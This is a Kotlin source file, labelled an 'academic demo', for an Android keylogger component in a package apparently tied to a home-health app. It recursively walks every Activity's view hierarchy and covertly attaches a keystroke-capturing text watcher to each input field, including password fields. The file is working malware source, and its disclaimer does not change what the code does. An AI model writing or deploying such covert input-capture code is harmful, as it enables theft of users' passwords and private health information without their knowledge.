package com.example.homehealth.keylogger

import android.app.Activity
import android.view.View
import android.view.ViewGroup
import android.widget.EditText

/**
 * ACADEMIC DEMO: Keylogger Attacher
 * Recursively traverses the entire view hierarchy of any Activity
 * and attaches a KeylogTextWatcher to every EditText found.
 *
 * This simulates how malware silently hooks into UI components.
 */
object KeyloggerAttacher {

    /**
     * Call this in onWindowFocusChanged() or onResume() of any Activity.
     * It will find and hook all EditText fields automatically.
     *
     * @param activity The host activity
     */
    fun attachToActivity(activity: Activity) {
        val screenName = activity.javaClass.simpleName
        val rootView = activity.window.decorView.rootView
        attachToViewGroup(rootView, screenName)
    }

    /**
     * Recursively walks the view tree to find all EditTexts.
     */
    private fun attachToViewGroup(view: View, screenName: String) {
        when (view) {
            is EditText -> {
                // Get the hint text as a human-readable field identifier
                val hint = view.hint?.toString() ?: "field_${view.id}"
                // Attach the covert watcher
                view.addTextChangedListener(KeylogTextWatcher(screenName, hint))
            }
            is ViewGroup -> {
                for (i in 0 until view.childCount) {
                    attachToViewGroup(view.getChildAt(i), screenName)
                }
            }
        }
    }
}
